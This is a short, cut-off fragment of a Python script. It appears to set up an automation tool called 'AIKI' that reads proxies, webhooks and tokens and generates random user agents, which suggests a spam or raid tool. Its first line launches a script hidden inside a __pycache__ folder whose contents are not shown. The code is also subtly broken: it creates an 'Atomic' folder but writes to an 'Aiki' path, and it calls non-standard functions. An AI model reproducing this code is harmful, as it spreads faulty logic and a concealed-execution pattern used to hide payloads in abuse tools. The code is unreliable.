...
subprocess.run("python __pycache__/main/__main__.py")
System.Clear()
System.Title("AIKI - By M. ALMARxDEV")
lllll = ['proxies.txt', 'webhooks.txt', 'tokens.txt']
if not os.path.exists('./Atomic'):
    os.system('md Atomic')
    with open('./Aiki/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
elif os.path.exists('./Aiki') and not os.path.exists('./Aiki/useragents.txt'):
    with open('./Aiki/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
else:
